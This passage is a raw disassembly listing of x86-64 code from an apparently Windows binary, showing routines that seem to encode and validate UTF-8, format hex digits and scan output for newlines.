   140004a14:	3d 00 00 01 00       	cmp    $0x10000,%eax
   140004a19:	73 26                	jae    0x140004a41
   140004a1b:	c1 e9 0c             	shr    $0xc,%ecx
   140004a1e:	80 c9 e0             	or     $0xe0,%cl
   140004a21:	88 4d fc             	mov    %cl,-0x4(%rbp)
   140004a24:	89 c1                	mov    %eax,%ecx
   140004a26:	c1 e9 06             	shr    $0x6,%ecx
   140004a29:	80 e1 3f             	and    $0x3f,%cl
   140004a2c:	80 c9 80             	or     $0x80,%cl
   140004a2f:	88 4d fd             	mov    %cl,-0x3(%rbp)
   140004a32:	24 3f                	and    $0x3f,%al
   140004a34:	0c 80                	or     $0x80,%al
   140004a36:	88 45 fe             	mov    %al,-0x2(%rbp)
   140004a39:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004a3f:	eb 32                	jmp    0x140004a73
   140004a41:	c1 e9 12             	shr    $0x12,%ecx
   140004a44:	80 c9 f0             	or     $0xf0,%cl
   140004a47:	88 4d fc             	mov    %cl,-0x4(%rbp)
   140004a4a:	89 c1                	mov    %eax,%ecx
   140004a4c:	c1 e9 0c             	shr    $0xc,%ecx
   140004a4f:	80 e1 3f             	and    $0x3f,%cl
   140004a52:	80 c9 80             	or     $0x80,%cl
   140004a55:	88 4d fd             	mov    %cl,-0x3(%rbp)
   140004a58:	89 c1                	mov    %eax,%ecx
   140004a5a:	c1 e9 06             	shr    $0x6,%ecx
   140004a5d:	80 e1 3f             	and    $0x3f,%cl
   140004a60:	80 c9 80             	or     $0x80,%cl
   140004a63:	88 4d fe             	mov    %cl,-0x2(%rbp)
   140004a66:	24 3f                	and    $0x3f,%al
   140004a68:	0c 80                	or     $0x80,%al
   140004a6a:	88 45 ff             	mov    %al,-0x1(%rbp)
   140004a6d:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004a73:	48 8d 45 fc          	lea    -0x4(%rbp),%rax
   140004a77:	48 89 d1             	mov    %rdx,%rcx
   140004a7a:	48 89 c2             	mov    %rax,%rdx
   140004a7d:	e8 ee ee ff ff       	call   0x140003970
   140004a82:	90                   	nop
   140004a83:	48 83 c4 30          	add    $0x30,%rsp
   140004a87:	5d                   	pop    %rbp
   140004a88:	c3                   	ret
   140004a89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004a90:	48 89 d1             	mov    %rdx,%rcx
   140004a93:	48 8d 15 15 18 86 00 	lea    0x861815(%rip),%rdx        # 0x1408662af
   140004a9a:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   140004aa0:	e9 cb ee ff ff       	jmp    0x140003970
   140004aa5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004aac:	00 00 00 00 
   140004ab0:	55                   	push   %rbp
   140004ab1:	48 83 ec 70          	sub    $0x70,%rsp
   140004ab5:	48 8d 6c 24 70       	lea    0x70(%rsp),%rbp
   140004aba:	48 89 ca             	mov    %rcx,%rdx
   140004abd:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   140004ac1:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004ac5:	48 8d 05 c4 ff ff ff 	lea    -0x3c(%rip),%rax        # 0x140004a90
   140004acc:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004ad0:	48 8d 05 d9 45 86 00 	lea    0x8645d9(%rip),%rax        # 0x1408690b0
   140004ad7:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140004adb:	48 c7 45 c0 01 00 00 	movq   $0x1,-0x40(%rbp)
   140004ae2:	00 
   140004ae3:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
   140004aea:	00 
   140004aeb:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140004aef:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140004af3:	48 c7 45 d0 01 00 00 	movq   $0x1,-0x30(%rbp)
   140004afa:	00 
   140004afb:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140004aff:	e8 4c e8 ff ff       	call   0x140003350
   140004b04:	cc                   	int3
   140004b05:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004b0c:	00 00 00 00 
   140004b10:	55                   	push   %rbp
   140004b11:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140004b18:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140004b1f:	00 
   140004b20:	0f b7 09             	movzwl (%rcx),%ecx
   140004b23:	b8 81 00 00 00       	mov    $0x81,%eax
   140004b28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004b2f:	00 
   140004b30:	44 0f b7 c9          	movzwl %cx,%r9d
   140004b34:	44 89 c9             	mov    %r9d,%ecx
   140004b37:	c1 e9 04             	shr    $0x4,%ecx
   140004b3a:	45 89 c8             	mov    %r9d,%r8d
   140004b3d:	41 80 e0 0f          	and    $0xf,%r8b
   140004b41:	45 8d 50 30          	lea    0x30(%r8),%r10d
   140004b45:	45 8d 58 57          	lea    0x57(%r8),%r11d
   140004b49:	41 80 f8 0a          	cmp    $0xa,%r8b
   140004b4d:	45 0f b6 c2          	movzbl %r10b,%r8d
   140004b51:	45 0f b6 d3          	movzbl %r11b,%r10d
   140004b55:	45 0f 42 d0          	cmovb  %r8d,%r10d
   140004b59:	49 89 c0             	mov    %rax,%r8
   140004b5c:	44 88 54 05 ae       	mov    %r10b,-0x52(%rbp,%rax,1)
   140004b61:	48 ff c8             	dec    %rax
   140004b64:	66 41 83 f9 0f       	cmp    $0xf,%r9w
   140004b69:	77 c5                	ja     0x140004b30
   140004b6b:	49 83 c0 fe          	add    $0xfffffffffffffffe,%r8
   140004b6f:	49 8d 0c 28          	lea    (%r8,%rbp,1),%rcx
   140004b73:	48 83 c1 b0          	add    $0xffffffffffffffb0,%rcx
   140004b77:	41 b8 81 00 00 00    	mov    $0x81,%r8d
   140004b7d:	49 29 c0             	sub    %rax,%r8
   140004b80:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140004b85:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004b8a:	4c 8d 05 02 2e 86 00 	lea    0x862e02(%rip),%r8        # 0x140867993
   140004b91:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140004b97:	48 89 d1             	mov    %rdx,%rcx
   140004b9a:	b2 01                	mov    $0x1,%dl
   140004b9c:	e8 df e7 ff ff       	call   0x140003380
   140004ba1:	90                   	nop
   140004ba2:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   140004ba9:	5d                   	pop    %rbp
   140004baa:	c3                   	ret
   140004bab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004bb0:	41 56                	push   %r14
   140004bb2:	56                   	push   %rsi
   140004bb3:	57                   	push   %rdi
   140004bb4:	55                   	push   %rbp
   140004bb5:	53                   	push   %rbx
   140004bb6:	45 31 c9             	xor    %r9d,%r9d
   140004bb9:	4c 89 c0             	mov    %r8,%rax
   140004bbc:	48 83 e8 0f          	sub    $0xf,%rax
   140004bc0:	4c 0f 43 c8          	cmovae %rax,%r9
   140004bc4:	4d 85 c0             	test   %r8,%r8
   140004bc7:	0f 84 a6 01 00 00    	je     0x140004d73
   140004bcd:	4c 8d 52 07          	lea    0x7(%rdx),%r10
   140004bd1:	49 83 e2 f8          	and    $0xfffffffffffffff8,%r10
   140004bd5:	49 29 d2             	sub    %rdx,%r10
   140004bd8:	31 c0                	xor    %eax,%eax
   140004bda:	48 8d 35 62 61 86 00 	lea    0x866162(%rip),%rsi        # 0x14086ad43
   140004be1:	48 bf 80 80 80 80 80 	movabs $0x8080808080808080,%rdi
   140004be8:	80 80 80 
   140004beb:	eb 12                	jmp    0x140004bff
   140004bed:	0f 1f 00             	nopl   (%rax)
   140004bf0:	49 ff c6             	inc    %r14
   140004bf3:	4c 89 f0             	mov    %r14,%rax
   140004bf6:	4c 39 c0             	cmp    %r8,%rax
   140004bf9:	0f 83 74 01 00 00    	jae    0x140004d73
   140004bff:	0f b6 1c 02          	movzbl (%rdx,%rax,1),%ebx
   140004c03:	84 db                	test   %bl,%bl
   140004c05:	78 59                	js     0x140004c60
   140004c07:	45 89 d3             	mov    %r10d,%r11d
   140004c0a:	41 29 c3             	sub    %eax,%r11d
   140004c0d:	41 f6 c3 07          	test   $0x7,%r11b
   140004c11:	74 11                	je     0x140004c24
   140004c13:	48 ff c0             	inc    %rax
   140004c16:	eb de                	jmp    0x140004bf6
   140004c18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004c1f:	00 
   140004c20:	48 83 c0 10          	add    $0x10,%rax
   140004c24:	4c 39 c8             	cmp    %r9,%rax
   140004c27:	73 0e                	jae    0x140004c37
   140004c29:	4c 8b 5c 02 08       	mov    0x8(%rdx,%rax,1),%r11
   140004c2e:	4c 0b 1c 02          	or     (%rdx,%rax,1),%r11
   140004c32:	49 85 fb             	test   %rdi,%r11
   140004c35:	74 e9                	je     0x140004c20
   140004c37:	4c 39 c0             	cmp    %r8,%rax
   140004c3a:	73 ba                	jae    0x140004bf6
   140004c3c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004c40:	80 3c 02 00          	cmpb   $0x0,(%rdx,%rax,1)
   140004c44:	78 b0                	js     0x140004bf6
   140004c46:	48 ff c0             	inc    %rax
   140004c49:	49 39 c0             	cmp    %rax,%r8
   140004c4c:	75 f2                	jne    0x140004c40
   140004c4e:	e9 20 01 00 00       	jmp    0x140004d73
   140004c53:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004c5a:	84 00 00 00 00 00 
   140004c60:	0f b6 2c 33          	movzbl (%rbx,%rsi,1),%ebp
   140004c64:	41 b3 01             	mov    $0x1,%r11b
   140004c67:	83 fd 04             	cmp    $0x4,%ebp
   140004c6a:	74 5b                	je     0x140004cc7
   140004c6c:	83 fd 03             	cmp    $0x3,%ebp
   140004c6f:	74 28                	je     0x140004c99
   140004c71:	83 fd 02             	cmp    $0x2,%ebp
   140004c74:	0f 85 0a 01 00 00    	jne    0x140004d84
   140004c7a:	4c 8d 70 01          	lea    0x1(%rax),%r14
   140004c7e:	4d 39 c6             	cmp    %r8,%r14
   140004c81:	0f 83 f8 00 00 00    	jae    0x140004d7f
   140004c87:	42 80 3c 32 bf       	cmpb   $0xbf,(%rdx,%r14,1)
   140004c8c:	b3 01                	mov    $0x1,%bl
   140004c8e:	0f 8e 5c ff ff ff    	jle    0x140004bf0
   140004c94:	e9 f1 00 00 00       	jmp    0x140004d8a
   140004c99:	4c 8d 70 01          	lea    0x1(%rax),%r14
   140004c9d:	4d 39 c6             	cmp    %r8,%r14
   140004ca0:	0f 83 d9 00 00 00    	jae    0x140004d7f
   140004ca6:	42 0f b6 2c 32       	movzbl (%rdx,%r14,1),%ebp
   140004cab:	48 81 fb e0 00 00 00 	cmp    $0xe0,%rbx
   140004cb2:	74 41                	je     0x140004cf5
   140004cb4:	81 fb ed 00 00 00    	cmp    $0xed,%ebx
   140004cba:	75 54                	jne    0x140004d10
   140004cbc:	40 80 fd 9f          	cmp    $0x9f,%bpl
   140004cc0:	7e 66                	jle    0x140004d28
   140004cc2:	e9 bd 00 00 00       	jmp    0x140004d84
   140004cc7:	4c 8d 70 01          	lea    0x1(%rax),%r14
   140004ccb:	4d 39 c6             	cmp    %r8,%r14
   140004cce:	0f 83 ab 00 00 00    	jae    0x140004d7f
   140004cd4:	42 0f b6 2c 32       	movzbl (%rdx,%r14,1),%ebp
   140004cd9:	48 81 fb f0 00 00 00 	cmp    $0xf0,%rbx
   140004ce0:	74 22                	je     0x140004d04
   140004ce2:	81 fb f4 00 00 00    	cmp    $0xf4,%ebx
   140004ce8:	75 54                	jne    0x140004d3e
   140004cea:	40 80 fd 8f          	cmp    $0x8f,%bpl
   140004cee:	7e 5c                	jle    0x140004d4c
   140004cf0:	e9 8f 00 00 00       	jmp    0x140004d84
   140004cf5:	40 80 e5 e0          	and    $0xe0,%bpl
   140004cf9:	40 80 fd a0          	cmp    $0xa0,%bpl
   140004cfd:	74 29                	je     0x140004d28
   140004cff:	e9 80 00 00 00       	jmp    0x140004d84
   140004d04:	40 80 c5 70          	add    $0x70,%bpl
   140004d08:	40 80 fd 30          	cmp    $0x30,%bpl
   140004d0c:	72 3e                	jb     0x140004d4c
   140004d0e:	eb 74                	jmp    0x140004d84
   140004d10:	44 8d 73 1f          	lea    0x1f(%rbx),%r14d
   140004d14:	41 80 fe 0c          	cmp    $0xc,%r14b
   140004d18:	72 08                	jb     0x140004d22
   140004d1a:	80 e3 fe             	and    $0xfe,%bl
   140004d1d:	80 fb ee             	cmp    $0xee,%bl
   140004d20:	75 62                	jne    0x140004d84
   140004d22:	40 80 fd c0          	cmp    $0xc0,%bpl
   140004d26:	7d 5c                	jge    0x140004d84
   140004d28:	4c 8d 70 02          	lea    0x2(%rax),%r14
   140004d2c:	4d 39 c6             	cmp    %r8,%r14
   140004d2f:	73 4e                	jae    0x140004d7f
   140004d31:	42 80 3c 32 bf       	cmpb   $0xbf,(%rdx,%r14,1)
   140004d36:	0f 8e b4 fe ff ff    	jle    0x140004bf0
   140004d3c:	eb 4a                	jmp    0x140004d88
   140004d3e:	80 c3 0f             	add    $0xf,%bl
   140004d41:	80 fb 02             	cmp    $0x2,%bl
   140004d44:	77 3e                	ja     0x140004d84
   140004d46:	40 80 fd c0          	cmp    $0xc0,%bpl
   140004d4a:	7d 38                	jge    0x140004d84
   140004d4c:	48 8d 58 02          	lea    0x2(%rax),%rbx
   140004d50:	4c 39 c3             	cmp    %r8,%rbx
   140004d53:	73 2a                	jae    0x140004d7f
   140004d55:	80 3c 1a bf          	cmpb   $0xbf,(%rdx,%rbx,1)
   140004d59:	7f 2d                	jg     0x140004d88
   140004d5b:	4c 8d 70 03          	lea    0x3(%rax),%r14
   140004d5f:	4d 39 c6             	cmp    %r8,%r14
   140004d62:	73 1b                	jae    0x140004d7f
   140004d64:	42 80 3c 32 c0       	cmpb   $0xc0,(%rdx,%r14,1)
   140004d69:	0f 8c 81 fe ff ff    	jl     0x140004bf0
   140004d6f:	b3 03                	mov    $0x3,%bl
   140004d71:	eb 17                	jmp    0x140004d8a
   140004d73:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   140004d77:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140004d7b:	31 c0                	xor    %eax,%eax
   140004d7d:	eb 1b                	jmp    0x140004d9a
   140004d7f:	45 31 db             	xor    %r11d,%r11d
   140004d82:	eb 06                	jmp    0x140004d8a
   140004d84:	b3 01                	mov    $0x1,%bl
   140004d86:	eb 02                	jmp    0x140004d8a
   140004d88:	b3 02                	mov    $0x2,%bl
   140004d8a:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004d8e:	44 88 59 10          	mov    %r11b,0x10(%rcx)
   140004d92:	88 59 11             	mov    %bl,0x11(%rcx)
   140004d95:	b8 01 00 00 00       	mov    $0x1,%eax
   140004d9a:	48 89 01             	mov    %rax,(%rcx)
   140004d9d:	5b                   	pop    %rbx
   140004d9e:	5d                   	pop    %rbp
   140004d9f:	5f                   	pop    %rdi
   140004da0:	5e                   	pop    %rsi
   140004da1:	41 5e                	pop    %r14
   140004da3:	c3                   	ret
   140004da4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004dab:	00 00 00 00 00 
   140004db0:	55                   	push   %rbp
   140004db1:	41 57                	push   %r15
   140004db3:	41 56                	push   %r14
   140004db5:	41 55                	push   %r13
   140004db7:	41 54                	push   %r12
   140004db9:	56                   	push   %rsi
   140004dba:	57                   	push   %rdi
   140004dbb:	53                   	push   %rbx
   140004dbc:	48 83 ec 58          	sub    $0x58,%rsp
   140004dc0:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140004dc5:	48 89 ce             	mov    %rcx,%rsi
   140004dc8:	41 b6 01             	mov    $0x1,%r14b
   140004dcb:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   140004dcf:	74 1c                	je     0x140004ded
   140004dd1:	44 88 76 08          	mov    %r14b,0x8(%rsi)
   140004dd5:	c6 46 09 01          	movb   $0x1,0x9(%rsi)
   140004dd9:	48 89 f0             	mov    %rsi,%rax
   140004ddc:	48 83 c4 58          	add    $0x58,%rsp
   140004de0:	5b                   	pop    %rbx
   140004de1:	5f                   	pop    %rdi
   140004de2:	5e                   	pop    %rsi
   140004de3:	41 5c                	pop    %r12
   140004de5:	41 5d                	pop    %r13
   140004de7:	41 5e                	pop    %r14
   140004de9:	41 5f                	pop    %r15
   140004deb:	5d                   	pop    %rbp
   140004dec:	c3                   	ret
   140004ded:	4c 89 cf             	mov    %r9,%rdi
   140004df0:	4c 8b 6d 70          	mov    0x70(%rbp),%r13
   140004df4:	48 8b 1e             	mov    (%rsi),%rbx
   140004df7:	f6 43 12 80          	testb  $0x80,0x12(%rbx)
   140004dfb:	0f b6 46 09          	movzbl 0x9(%rsi),%eax
   140004dff:	75 71                	jne    0x140004e72
   140004e01:	49 89 d4             	mov    %rdx,%r12
   140004e04:	4d 89 c7             	mov    %r8,%r15
   140004e07:	44 0f b6 c0          	movzbl %al,%r8d
   140004e0b:	49 83 f0 03          	xor    $0x3,%r8
   140004e0f:	48 8d 0d 0b 2b 86 00 	lea    0x862b0b(%rip),%rcx        # 0x140867921
   140004e16:	48 8d 15 71 2b 86 00 	lea    0x862b71(%rip),%rdx        # 0x14086798e
   140004e1d:	84 c0                	test   %al,%al
   140004e1f:	48 0f 45 d1          	cmovne %rcx,%rdx
   140004e23:	48 8b 0b             	mov    (%rbx),%rcx
   140004e26:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004e2a:	ff 50 18             	call   *0x18(%rax)
   140004e2d:	84 c0                	test   %al,%al
   140004e2f:	75 a0                	jne    0x140004dd1
   140004e31:	48 8b 0b             	mov    (%rbx),%rcx
   140004e34:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004e38:	4c 89 e2             	mov    %r12,%rdx
   140004e3b:	4d 89 f8             	mov    %r15,%r8
   140004e3e:	ff 50 18             	call   *0x18(%rax)
   140004e41:	84 c0                	test   %al,%al
   140004e43:	75 8c                	jne    0x140004dd1
   140004e45:	48 8b 0b             	mov    (%rbx),%rcx
   140004e48:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004e4c:	48 8d 15 6d 2d 86 00 	lea    0x862d6d(%rip),%rdx        # 0x140867bc0
   140004e53:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004e59:	ff 50 18             	call   *0x18(%rax)
   140004e5c:	84 c0                	test   %al,%al
   140004e5e:	0f 85 6d ff ff ff    	jne    0x140004dd1
   140004e64:	48 89 f9             	mov    %rdi,%rcx
   140004e67:	48 89 da             	mov    %rbx,%rdx
   140004e6a:	41 ff d5             	call   *%r13
   140004e6d:	e9 b9 00 00 00       	jmp    0x140004f2b
   140004e72:	84 c0                	test   %al,%al
   140004e74:	75 32                	jne    0x140004ea8
   140004e76:	48 8b 0b             	mov    (%rbx),%rcx
   140004e79:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   140004e7d:	48 8d 05 80 16 86 00 	lea    0x861680(%rip),%rax        # 0x140866504
   140004e84:	4d 89 c6             	mov    %r8,%r14
   140004e87:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004e8d:	49 89 d7             	mov    %rdx,%r15
   140004e90:	48 89 c2             	mov    %rax,%rdx
   140004e93:	41 ff 51 18          	call   *0x18(%r9)
   140004e97:	4c 89 fa             	mov    %r15,%rdx
   140004e9a:	4d 89 f0             	mov    %r14,%r8
   140004e9d:	41 b6 01             	mov    $0x1,%r14b
   140004ea0:	84 c0                	test   %al,%al
   140004ea2:	0f 85 29 ff ff ff    	jne    0x140004dd1
   140004ea8:	c6 45 07 01          	movb   $0x1,0x7(%rbp)
   140004eac:	0f 10 03             	movups (%rbx),%xmm0
   140004eaf:	0f 11 45 d0          	movups %xmm0,-0x30(%rbp)
   140004eb3:	48 8d 45 07          	lea    0x7(%rbp),%rax
   140004eb7:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004ebb:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140004ebf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004ec3:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004ec7:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140004ecb:	48 8d 05 fe 15 86 00 	lea    0x8615fe(%rip),%rax        # 0x1408664d0
   140004ed2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004ed6:	e8 65 00 00 00       	call   0x140004f40
   140004edb:	84 c0                	test   %al,%al
   140004edd:	0f 85 ee fe ff ff    	jne    0x140004dd1
   140004ee3:	48 8d 15 d6 2c 86 00 	lea    0x862cd6(%rip),%rdx        # 0x140867bc0
   140004eea:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004eee:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004ef4:	e8 47 00 00 00       	call   0x140004f40
   140004ef9:	84 c0                	test   %al,%al
   140004efb:	0f 85 d0 fe ff ff    	jne    0x140004dd1
   140004f01:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140004f05:	48 89 f9             	mov    %rdi,%rcx
   140004f08:	41 ff d5             	call   *%r13
   140004f0b:	84 c0                	test   %al,%al
   140004f0d:	0f 85 be fe ff ff    	jne    0x140004dd1
   140004f13:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004f17:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004f1b:	48 8d 15 e5 15 86 00 	lea    0x8615e5(%rip),%rdx        # 0x140866507
   140004f22:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004f28:	ff 50 18             	call   *0x18(%rax)
   140004f2b:	41 89 c6             	mov    %eax,%r14d
   140004f2e:	e9 9e fe ff ff       	jmp    0x140004dd1
   140004f33:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004f3a:	84 00 00 00 00 00 
   140004f40:	55                   	push   %rbp
   140004f41:	41 57                	push   %r15
   140004f43:	41 56                	push   %r14
   140004f45:	41 55                	push   %r13
   140004f47:	41 54                	push   %r12
   140004f49:	56                   	push   %rsi
   140004f4a:	57                   	push   %rdi
   140004f4b:	53                   	push   %rbx
   140004f4c:	48 83 ec 48          	sub    $0x48,%rsp
   140004f50:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140004f55:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140004f59:	49 bc 80 80 80 80 80 	movabs $0x8080808080808080,%r12
   140004f60:	80 80 80 
   140004f63:	48 bb 0a 0a 0a 0a 0a 	movabs $0xa0a0a0a0a0a0a0a,%rbx
   140004f6a:	0a 0a 0a 
   140004f6d:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140004f71:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004f75:	48 8b 01             	mov    (%rcx),%rax
   140004f78:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004f7c:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140004f80:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004f84:	31 ff                	xor    %edi,%edi
   140004f86:	45 31 ed             	xor    %r13d,%r13d
   140004f89:	45 31 f6             	xor    %r14d,%r14d
   140004f8c:	4c 89 45 f8          	mov    %r8,-0x8(%rbp)
   140004f90:	eb 49                	jmp    0x140004fdb
   140004f92:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004f99:	1f 84 00 00 00 00 00 
   140004fa0:	43 80 7c 22 ff 0a    	cmpb   $0xa,-0x1(%r10,%r12,1)
   140004fa6:	0f 94 c0             	sete   %al
   140004fa9:	4d 29 ec             	sub    %r13,%r12
   140004fac:	4d 01 d5             	add    %r10,%r13
   140004faf:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140004fb3:	88 01                	mov    %al,(%rcx)
   140004fb5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004fb9:	4c 89 ea             	mov    %r13,%rdx
   140004fbc:	4d 89 e0             	mov    %r12,%r8
   140004fbf:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004fc3:	ff 50 18             	call   *0x18(%rax)
   140004fc6:	4d 89 fd             	mov    %r15,%r13
   140004fc9:	84 c0                	test   %al,%al
   140004fcb:	49 89 dc             	mov    %rbx,%r12
   140004fce:	48 89 f3             	mov    %rsi,%rbx
   140004fd1:	4c 8b 45 f8          	mov    -0x8(%rbp),%r8
   140004fd5:	0f 85 f8 01 00 00    	jne    0x1400051d3
   140004fdb:	41 f6 c6 01          	test   $0x1,%r14b
   140004fdf:	0f 85 ea 01 00 00    	jne    0x1400051cf
   140004fe5:	49 39 f8             	cmp    %rdi,%r8
   140004fe8:	73 16                	jae    0x140005000
   140004fea:	49 89 ff             	mov    %rdi,%r15
   140004fed:	4c 8b 55 00          	mov    0x0(%rbp),%r10
   140004ff1:	e9 7d 01 00 00       	jmp    0x140005173
   140004ff6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140004ffd:	00 00 00 
   140005000:	4c 8b 55 00          	mov    0x0(%rbp),%r10
   140005004:	eb 16                	jmp    0x14000501c
   140005006:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000500d:	00 00 00 
   140005010:	4c 89 ff             	mov    %r15,%rdi
   140005013:	4d 39 c7             	cmp    %r8,%r15
   140005016:	0f 87 57 01 00 00    	ja     0x140005173
   14000501c:	4c 89 c1             	mov    %r8,%rcx
   14000501f:	48 29 f9             	sub    %rdi,%rcx
   140005022:	49 8d 04 3a          	lea    (%r10,%rdi,1),%rax
   140005026:	48 83 f9 0f          	cmp    $0xf,%rcx
   14000502a:	77 34                	ja     0x140005060
   14000502c:	49 39 f8             	cmp    %rdi,%r8
   14000502f:	0f 84 3b 01 00 00    	je     0x140005170
   140005035:	45 31 c9             	xor    %r9d,%r9d
   140005038:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000503f:	00 
   140005040:	42 80 3c 08 0a       	cmpb   $0xa,(%rax,%r9,1)
   140005045:	0f 84 e9 00 00 00    	je     0x140005134
   14000504b:	49 ff c1             	inc    %r9
   14000504e:	4c 39 c9             	cmp    %r9,%rcx
   140005051:	75 ed                	jne    0x140005040
   140005053:	e9 18 01 00 00       	jmp    0x140005170
   140005058:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000505f:	00 
   140005060:	48 8d 70 07          	lea    0x7(%rax),%rsi
   140005064:	48 83 e6 f8          	and    $0xfffffffffffffff8,%rsi
   140005068:	48 89 f2             	mov    %rsi,%rdx
   14000506b:	48 29 c2             	sub    %rax,%rdx
   14000506e:	74 2e                	je     0x14000509e
   140005070:	45 31 c9             	xor    %r9d,%r9d
   140005073:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000507a:	84 00 00 00 00 00 
   140005080:	42 80 3c 08 0a       	cmpb   $0xa,(%rax,%r9,1)
   140005085:	0f 84 a9 00 00 00    	je     0x140005134
   14000508b:	49 ff c1             	inc    %r9
   14000508e:	4c 39 ca             	cmp    %r9,%rdx
   140005091:	75 ed                	jne    0x140005080
   140005093:	4c 8d 49 f0          	lea    -0x10(%rcx),%r9
   140005097:	4c 39 ca             	cmp    %r9,%rdx
   14000509a:	76 06                	jbe    0x1400050a2
   14000509c:	eb 5c                	jmp    0x1400050fa
   14000509e:	4c 8d 49 f0          	lea    -0x10(%rcx),%r9
   1400050a2:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400050a8:	4c 01 c6             	add    %r8,%rsi
   1400050ab:	49 b8 00 01 01 01 01 	movabs $0x101010101010100,%r8
   1400050b2:	01 01 01 
   1400050b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400050bc:	00 00 00 00 
   1400050c0:	4c 8b 56 f8          	mov    -0x8(%rsi),%r10
   1400050c4:	4d 89 d3             	mov    %r10,%r11
   1400050c7:	49 31 db             	xor    %rbx,%r11
   1400050ca:	4d 89 c6             	mov    %r8,%r14
   1400050cd:	4d 29 de             	sub    %r11,%r14
   1400050d0:	4d 09 d6             	or     %r10,%r14
   1400050d3:	4c 8b 16             	mov    (%rsi),%r10
   1400050d6:	49 31 da             	xor    %rbx,%r10
   1400050d9:	4d 89 c3             	mov    %r8,%r11
   1400050dc:	4d 29 d3             	sub    %r10,%r11
   1400050df:	4d 09 d3             	or     %r10,%r11
   1400050e2:	4d 21 e6             	and    %r12,%r14
   1400050e5:	4d 21 de             	and    %r11,%r14
   1400050e8:	4d 39 e6             	cmp    %r12,%r14
   1400050eb:	75 0d                	jne    0x1400050fa
   1400050ed:	48 83 c2 10          	add    $0x10,%rdx
   1400050f1:	48 83 c6 10          	add    $0x10,%rsi
   1400050f5:	4c 39 ca             	cmp    %r9,%rdx
   1400050f8:	76 c6                	jbe    0x1400050c0
   1400050fa:	48 39 d1             	cmp    %rdx,%rcx
   1400050fd:	0f 84 c0 00 00 00    	je     0x1400051c3
   140005103:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   140005107:	4c 8b 45 f8          	mov    -0x8(%rbp),%r8
   14000510b:	4d 89 c3             	mov    %r8,%r11
   14000510e:	49 29 d3             	sub    %rdx,%r11
   140005111:	49 29 fb             	sub    %rdi,%r11
   140005114:	45 31 c9             	xor    %r9d,%r9d
   140005117:	4c 8b 55 00          	mov    0x0(%rbp),%r10
